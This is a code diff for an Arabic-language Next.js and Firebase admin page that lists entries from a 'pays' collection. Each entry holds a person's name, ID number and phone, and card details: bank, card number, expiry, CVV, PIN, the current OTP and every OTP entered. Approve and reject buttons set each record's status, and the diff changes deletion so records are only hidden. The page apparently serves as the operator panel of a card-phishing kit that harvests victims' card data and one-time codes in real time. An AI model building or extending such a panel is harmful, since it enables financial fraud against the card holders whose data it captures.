@@ -1,34 +1,32 @@
-'use client';
+"use client";
 
-import { useState, useEffect } from 'react';
-import { useRouter } from 'next/navigation';
-import { Trash2 } from 'lucide-react';
-import { Button } from '@/components/ui/button';
-import { Badge } from '@/components/ui/badge';
+import { useState, useEffect } from "react";
+import { useRouter } from "next/navigation";
+import { Trash2 } from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { ar } from "date-fns/locale";
+
+import { formatDistanceToNow } from "date-fns";
 import {
   Dialog,
   DialogContent,
   DialogDescription,
   DialogHeader,
   DialogTitle,
-} from '@/components/ui/dialog';
-import { db, auth } from '@/lib/firestore';
+} from "@/components/ui/dialog";
+import { db, auth } from "@/lib/firestore";
 import {
   collection,
-  getDocs,
   doc,
-  deleteDoc,
   writeBatch,
   updateDoc,
   onSnapshot,
   query,
   orderBy,
-} from 'firebase/firestore';
-import { onAuthStateChanged, signOut } from 'firebase/auth';
-import { playNotificationSound } from '@/lib/actions';
-import { GET } from '../api/location/route';
-import { ipAddress } from '@vercel/functions';
-import IPLocation from '@/components/ip';
+} from "firebase/firestore";
+import { onAuthStateChanged, signOut } from "firebase/auth";
+import { playNotificationSound } from "@/lib/actions";
 
 interface Notification {
   id: string;
@@ -43,36 +41,35 @@ interface Notification {
     fullName: string;
     phone: string;
   };
-  cardInfo?: {
-    bank:string;
-    cardNumber: string;
-    prefix:string;
-    expirationDate: string;
-    cvv: string;
-    otp: string;
-    password:string;
-    allOtps: string[];
-    status?: 'pending' | 'approved' | 'rejected';
-  };
+  bank: string;
+  cardNumber: string;
+  prefix: string;
+  year: string;
+  month: string;
+  cvv: string;
+  otp: string;
+  pass: string;
+  allOtps: string[];
+  status?: "pending" | "approved" | "rejected";
+  isHidden?: boolean;
 }
 
-export default function NotificationsPage() {
+export default function NotificationsPage1() {
   const [notifications, setNotifications] = useState<Notification[]>([]);
   const [isLoading, setIsLoading] = useState(true);
-  const [pageName, setPagename] = useState<string>('');
+  const [pageName, setPagename] = useState<string>("");
   const [message, setMessage] = useState<boolean>(false);
-  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
     null
   );
   const [selectedNotification, setSelectedNotification] =
     useState<Notification | null>(null);
   const router = useRouter();
 
-
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
-        router.push('/login');
+        router.push("/login");
       } else {
         const unsubscribeNotifications = fetchNotifications();
         return () => {
@@ -85,22 +82,22 @@ export default function NotificationsPage() {
   }, [router]);
 
   const fetchNotifications = () => {
-  
     setIsLoading(true);
-    const q = query(collection(db, 'pays'), orderBy('createdDate', 'desc'));
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
-        const notificationsData = querySnapshot.docs.map((doc) => ({
-          id: doc.id,
-          ...doc.data(),
-        })) as Notification[];
+        const notificationsData = querySnapshot.docs
+          .map((doc) => ({ id: doc.id, ...doc.data() } as any))
+          .filter(
+            (notification: any) => !notification.isHidden
+          ) as Notification[];
         setNotifications(notificationsData);
         setIsLoading(false);
         playNotificationSound();
       },
       (error) => {
-        console.error('Error fetching notifications:', error);
+        console.error("Error fetching notifications:", error);
         setIsLoading(false);
       }
     );
@@ -112,13 +109,13 @@ export default function NotificationsPage() {
     try {
       const batch = writeBatch(db);
       notifications.forEach((notification) => {
-        const docRef = doc(db, 'pays', notification.id);
-        batch.delete(docRef);
+        const docRef = doc(db, "pays", notification.id);
+        batch.update(docRef, { isHidden: true });
       });
       await batch.commit();
       setNotifications([]);
     } catch (error) {
-      console.error('Error clearing notifications:', error);
+      console.error("Error hiding all notifications:", error);
     } finally {
       setIsLoading(false);
     }
@@ -126,37 +123,38 @@ export default function NotificationsPage() {
 
   const handleDelete = async (id: string) => {
     try {
-      await deleteDoc(doc(db, 'pays', id));
+      const docRef = doc(db, "pays", id);
+      await updateDoc(docRef, { isHidden: true });
       setNotifications(
         notifications.filter((notification) => notification.id !== id)
       );
     } catch (error) {
-      console.error('Error deleting notification:', error);
+      console.error("Error hiding notification:", error);
     }
   };
 
   const handlePageName = (id: string) => {
-    setPagename('asd');
+    setPagename("asd");
   };
   const handleApproval = async (state: string, id: string) => {
-    const targetPost = doc(db, 'pays', id);
+    const targetPost = doc(db, "pays", id);
     await updateDoc(targetPost, {
-      cardState: state,
+      status: state,
     });
   };
 
   const handleLogout = async () => {
     try {
       await signOut(auth);
-      router.push('/login');
+      router.push("/login");
     } catch (error) {
-      console.error('Error signing out:', error);
+      console.error("Error signing out:", error);
     }
   };
 
   const handleInfoClick = (
     notification: Notification,
-    infoType: 'personal' | 'card'
+    infoType: "personal" | "card"
   ) => {
     setSelectedNotification(notification);
     setSelectedInfo(infoType);
@@ -169,14 +167,14 @@ export default function NotificationsPage() {
 
   if (isLoading) {
     return (
-      <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
+      <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">
         جاري التحميل...
       </div>
     );
   }
 
   return (
-    <div dir="rtl" className="min-h-screen bg-gray-900 text-white p-4">
+    <div dir="rtl" className="min-h-screen bg-gray-300 text-black p-4">
       <div className="max-w-7xl mx-auto">
         <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
           <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
@@ -192,17 +190,17 @@ export default function NotificationsPage() {
             <Button
               variant="outline"
               onClick={handleLogout}
-              className="bg-gray-700 hover:bg-gray-600"
+              className="bg-gray-100 hover:bg-gray-100"
             >
               تسجيل الخروج
             </Button>
           </div>
         </div>
 
-        <div className="bg-gray-800 rounded-lg overflow-x-auto">
+        <div className="bg-gray-100 rounded-lg overflow-x-auto">
           <table className="w-full">
             <thead>
-              <tr className="border-b border-gray-700">
+              <tr className="border-b border-gray-100">
                 <th className="px-4 py-3 text-right">الإسم</th>
                 <th className="px-4 py-3 text-right">المعلومات</th>
                 <th className="px-4 py-3 text-right">الصفحة الحالية</th>
@@ -222,38 +220,47 @@ export default function NotificationsPage() {
                       <Badge
                         variant={
                           notification.hasPersonalInfo
-                            ? 'default'
-                            : 'destructive'
+                            ? "default"
+                            : "destructive"
                         }
                         className="rounded-md cursor-pointer"
                         onClick={() =>
-                          handleInfoClick(notification, 'personal')
+                          handleInfoClick(notification, "personal")
                         }
                       >
                         {notification.hasPersonalInfo
-                          ? 'معلومات شخصية'
-                          : 'لا يوجد معلومات'}
+                          ? "معلومات شخصية"
+                          : "لا يوجد معلومات"}
                       </Badge>
                       <Badge
                         variant={
-                          notification.hasCardInfo ? 'default' : 'destructive'
+                          notification.cardNumber ? "default" : "destructive"
                         }
                         className={`rounded-md cursor-pointer ${
-                          notification.hasCardInfo ? 'bg-green-500' : ''
+                          notification.cardNumber ? "bg-green-500" : ""
                         }`}
-                        onClick={() => handleInfoClick(notification, 'card')}
+                        onClick={() => handleInfoClick(notification, "card")}
                       >
-                        {notification.hasCardInfo
-                          ? 'معلومات البطاقة'
-                          : 'لا يوجد بطاقة'}
+                        {notification.cardNumber
+                          ? "معلومات البطاقة"
+                          : "لا يوجد بطاقة"}
                       </Badge>
                     </div>
                   </td>
-                  <td className="px-4 py-3">خطوه - {notification.currentPage  }</td>
-                  <td className="px-4 py-3">{notification.createdDate!}</td>
+                  <td className="px-4 py-3">
+                    خطوه - {notification.currentPage}
+                  </td>
+                  <td className="px-4 py-3">
+                    {formatDistanceToNow(new Date(notification.createdDate), {
+                      addSuffix: true,
+                      locale: ar,
+                    })}
+                  </td>{" "}
                   <td className="px-4 py-3 text-center">
                     <Badge variant="default" className="bg-green-500">
-                      {parseInt(notification!.notificationCount!.toString()!) + 1}
+                      {Number.parseInt(
+                        notification!.notificationCount!.toString()!
+                      ) + 1}
                     </Badge>
                   </td>
                   <td className="px-4 py-3 text-center">
@@ -274,80 +281,76 @@ export default function NotificationsPage() {
       </div>
 
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="bg-gray-800 text-white" dir="rtl">
+        <DialogContent className="bg-gray-100 text-black" dir="rtl">
           <DialogHeader>
             <DialogTitle dir="rtl">
-              {selectedInfo === 'personal'
-                ? 'المعلومات الشخصية'
-                : 'معلومات البطاقة'}
+              {selectedInfo === "personal"
+                ? "المعلومات الشخصية"
+                : "معلومات البطاقة"}
             </DialogTitle>
             <DialogDescription>
-              {selectedInfo === 'personal'
-                ? 'تفاصيل المعلومات الشخصية'
-                : 'تفاصيل معلومات البطاقة'}
+              {selectedInfo === "personal"
+                ? "تفاصيل المعلومات الشخصية"
+                : "تفاصيل معلومات البطاقة"}
             </DialogDescription>
           </DialogHeader>
-          {selectedInfo === 'personal' &&
+          {selectedInfo === "personal" &&
             selectedNotification?.personalInfo && (
               <div className="space-y-2">
                 <p>
-                  <strong>الاسم الكامل:</strong>{' '}
+                  <strong>الاسم الكامل:</strong>{" "}
                   {selectedNotification.personalInfo.fullName}
                 </p>
                 <p>
-                  <strong>رقم الهوية:</strong>{' '}
+                  <strong>رقم الهوية:</strong>{" "}
                   {selectedNotification.personalInfo.id}
                 </p>
                 <p>
-                  <strong>رقم الهاتف:</strong>{' '}
+                  <strong>رقم الهاتف:</strong>{" "}
                   {selectedNotification.personalInfo.phone}
                 </p>
               </div>
             )}
-          {selectedInfo === 'card' && selectedNotification?.cardInfo && (
+          {selectedInfo === "card" && selectedNotification && (
             <div className="space-y-2">
               <p>
-                <strong className="text-red-400 mx-4">البنك:</strong>{' '}
-                {selectedNotification.cardInfo.bank}
+                <strong className="text-red-400 mx-4">البنك:</strong>{" "}
+                {selectedNotification.bank}
+              </p>
+              <p></p>
+              <p>
+                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
+                {selectedNotification.cardNumber &&
+                  selectedNotification.cardNumber}
+                - {selectedNotification.prefix}
               </p>
               <p>
-                <strong className="text-red-400 mx-4">prefix:</strong>{' '}
-                {selectedNotification.cardInfo.prefix}
+                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{" "}
+                {selectedNotification.year}/{selectedNotification.month}
               </p>
-              <p>
-                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
-                {selectedNotification.cardInfo.cardNumber}
+
+              <p className="flex items-center">
+                <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{" "}
+                {selectedNotification.pass}
               </p>
-              <p>
-                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
-                {selectedNotification.cardInfo.expirationDate}
+              <p className="flex items-centerpt-4">
+                <strong className="text-red-400 mx-4">رمز التحقق :</strong>{" "}
+                {selectedNotification.otp}
               </p>
-              <div className="grid grid-cols-2">
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز الأمان:</strong>{' '}
-                  {selectedNotification.cardInfo.cvv}
-                </p>
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
-                  {selectedNotification.cardInfo.otp}
-                </p>
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{' '}
-                  {selectedNotification.cardInfo.password}
-                </p>
-              </div>
-              <>
-              
-              
-              </>
+              <></>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
-                {selectedNotification.cardInfo.allOtps.join(',')}
+                <div className="grid grid-cols-4">
+                  {selectedNotification.allOtps &&
+                    selectedNotification.allOtps.map((i, index) => (
+                      <Badge key={index}>{i}</Badge>
+                    ))}
+                </div>
               </p>
               <div className="flex justify-between mx-1">
                 <Button
                   onClick={() => {
-                    handleApproval('approved', selectedNotification.id);
+                    handleApproval("approved", selectedNotification.id);
                     setMessage(true);
                     setTimeout(() => {
                       setMessage(false);
@@ -359,7 +362,7 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handleApproval('rejected', selectedNotification.id);
+                    handleApproval("rejected", selectedNotification.id);
                     setMessage(true);
                     setTimeout(() => {
                       setMessage(false);
@@ -371,7 +374,7 @@ export default function NotificationsPage() {
                   رفض
                 </Button>
               </div>
-              <p className="text-red-500">{message ? 'تم الارسال' : ''}</p>
+              <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
             </div>
           )}
         </DialogContent>
